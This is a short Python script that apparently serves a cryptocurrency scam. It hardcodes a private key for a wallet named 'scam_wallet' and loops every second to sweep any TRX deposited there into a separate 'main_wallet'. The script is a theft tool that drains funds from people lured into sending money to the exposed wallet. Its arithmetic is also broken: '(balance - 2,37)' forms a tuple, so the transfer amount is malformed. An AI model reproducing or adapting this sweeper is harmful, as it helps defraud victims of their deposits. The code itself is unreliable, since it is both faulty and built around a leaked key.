from tronpy import Tron
from tronpy.keys import PrivateKey
import time

HALF_TRON = 500000
ONE_TRON = 1000000

main_wallet = "TCyVZBubBNKpnZHEp266dR9LthaL15fbke"
scam_wallet = "TMfC1kmEL4NMNDPH4EK6mnSkJL4uDWxQc4"
private_key = "5b4886ef02d4dec7931f4c28dd0d5535bee71d9b1819759b5b13f2a3155f99aa"

client = Tron()

def send_tron(amount, wallet):
    try:
        priv_key = PrivateKey(bytes.fromhex(private_key))

        txn = (
            client.trx.transfer(scam_wallet, str(wallet), int(amount))
            .memo("Transaction Description")
            .build()
            .inspect()
            .sign(priv_key)
            .broadcast()
        )

        return txn.wait()

    except Exception as ex:
        return ex

def account_balance(address):
    balance = client.get_account_balance(str(address))
    return balance

while True:
    time.sleep(1)
    balance = account_balance(scam_wallet)
    if balance > 7:
        amount = (balance - 2,37) * 1000000
        send_tron(amount, main_wallet)
